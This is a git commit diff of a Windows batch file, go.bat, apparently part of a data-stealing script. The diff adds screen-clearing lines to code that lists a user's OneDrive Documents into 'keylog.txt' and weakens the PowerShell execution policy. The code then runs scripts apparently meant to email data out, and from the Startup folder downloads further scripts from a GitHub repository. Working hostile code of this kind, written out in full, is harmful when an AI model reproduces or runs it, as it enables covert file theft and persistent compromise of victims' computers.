e43162e63299018c24cf02e20f47983eab0ed2b6
Quentinq32 <100795382+Quentinq32@users.noreply.github.com>
2022-03-13 19:39:37 +0100

    Add files via upload

--- go.bat
+++ go.bat
@@ -3,11 +3,14 @@ cd/
 cd %USERPROFILE%\OneDrive\Documents\
 dir /s > keylog.txt
 @echo off
+cls
 powershell Set-ExecutionPolicy RemoteSigned
 powershell Get-ExecutionPolicy
+cls
 powershell c:/script\mail2.ps1
 powershell c:/script\mail1.ps1
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
+cls
 WScript C:\script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
 cd c:/script/
 WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
